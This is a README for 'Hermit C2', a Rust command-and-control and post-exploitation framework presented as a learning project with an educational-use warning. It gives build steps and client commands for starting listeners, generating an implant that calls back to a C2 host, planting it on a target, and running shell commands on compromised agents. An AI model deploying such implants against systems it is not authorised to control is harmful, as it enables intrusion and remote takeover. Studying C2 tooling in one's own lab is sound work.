# Hermit C2

Command & Control, Post-Exploitation Framework written in Rust.  
I developed this project for learning Rust and how C2 framework works.

<br />

## WARNING

This project is only be used for educational and learning purposes and for experimentation in your own environment.  
It's prohibited to use on systems not under your control.

<br />

## PREREQUISITES

### C2 Server

```sh
# For Linux agent
rustup target add x86_64-unknown-linux-gnu
rustup target add i686-unknown-linux-gnu
# `libxcb` is used for screenshots in Linux target machine.
sudo apt install libxcb-xfixes0-dev

# For Windows agent
rustup target add x86_64-pc-windows-gnu
rustup target add i686-pc-windows-gnu
```

- **Linux**

Run the following command in the system which is going to run C2 server.

```sh
sudo apt install -y git build-essential mingw-w64
```

<br />

## USAGE

### C2 Server

```sh
hermit server
```

### C2 Client

```sh
# Connect to C2 server
hermit client -H my-c2-server.com -P 9999

# Print the usage.
Hermit $ help

# Add a new listener and start it
Hermit $ listener add -H my-c2-server.com -P 8000
Hermit $ listener start 0

# Generate a new implant
Hermit $ implant gen -l http://my-c2-server.com:8000/

# After genrating, transfer the implant to target machine and run it.
# When the target connected to our listener, we can control this machine.

# List agents
Hermit $ agents

# Switch to a specified agent mode
Hermit $ agent use 0

# e.g. Execute shell command for the target
Hermit [agent: agent_0123456] $ shell whoami
```

<br />

## INSTALLATION

```sh
git clone https://github.com/hideckies/hermit.git
cd hermit
cargo build --release
# After compiling, the `hermit` binary will be stored at `target/release/` folder.
```